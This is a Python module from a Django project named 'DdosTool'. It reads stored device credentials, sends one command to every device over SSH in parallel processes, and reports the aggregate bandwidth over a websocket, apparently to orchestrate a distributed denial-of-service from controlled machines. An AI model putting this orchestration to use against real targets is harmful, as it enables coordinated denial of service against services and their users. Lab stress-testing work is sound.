import multiprocessing as mp
import threading
from time import sleep
from typing import List
import redis
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from DdosTool.models import Devices
from DdosTool.ssh.sshData import PcSSHInfo

stop_Threads = False
processList: List[mp.Process] = list()  # oluşturulan processlerin listesi
deviceList: List[PcSSHInfo] = list()  # ssh ile bağlanacak cihazların class bilgileri
channel_layer = get_channel_layer()  # websocket channel verisi alınır


# veri tabanındaki cihaz bilgileri listeye aktarılır


def updateDeviceList():
    devicesFromDB = Devices.objects.all()  # veritabanından bağlanacak cihaz bilgileri
    for device in devicesFromDB:
        deviceList.append(PcSSHInfo(device.ip, device.username, device.password, 22))


class SshProc:
    def __init__(self):
        self.stop_Threads = False
        self.commandStatus = False
        self.__red = redis.StrictRedis(host="localhost", port=6379, db=0, charset="utf-8", decode_responses=True)

    def sendCommand(self, command, bandwidth):
        if self.commandStatus is False:
            deviceList.clear()
            updateDeviceList()
            processList.clear()
            self.stop_Threads = False
            try:
                for dev in deviceList:
                    processList.append(mp.Process(target=dev.sshSendCommand, args=(command,)))
                print('verileri sildim')
                for process in processList:
                    process.start()
                threading.Thread(target=self.sendToWebSocket, args=(bandwidth,)).start()
                self.commandStatus = True
                return True
            except:
                print('hata oluştu')
                return False
        else:
            return False

    def cancelCommand(self):
        if self.commandStatus:
            try:
                for process in processList:
                    if process.is_alive():
                        process.kill()
                self.stop_Threads = True
                self.commandStatus = False
                return True
            except:
                return False
        else:
            return False

    def sendToWebSocket(self, bandwidth):
        sozluk = {}
        print('websocket veri gönderiliyor')
        while True:
            sleep(1)
            for process in processList:
                if process.is_alive() is False:
                    processList.remove(process)
            if len(processList) == 0:
                break
                print('aktif cihaz yok')
            for dev in deviceList:
                sozluk[dev.ip] = self.__red.get(dev.ip)
            sozluk['bandwidth'] = len(processList) * float(bandwidth)
            if self.stop_Threads:
                break
            try:
                async_to_sync(channel_layer.group_send)(
                    'Datas',  # <-- consumers.py içindeki room group name ile aynı olmalı
                    {
                        'type': 'sendData',
                        'data': sozluk,
                    }
                )
            except:
                print('veri gönderilemiyor')
        print('websocket veri gönderimi durdu')
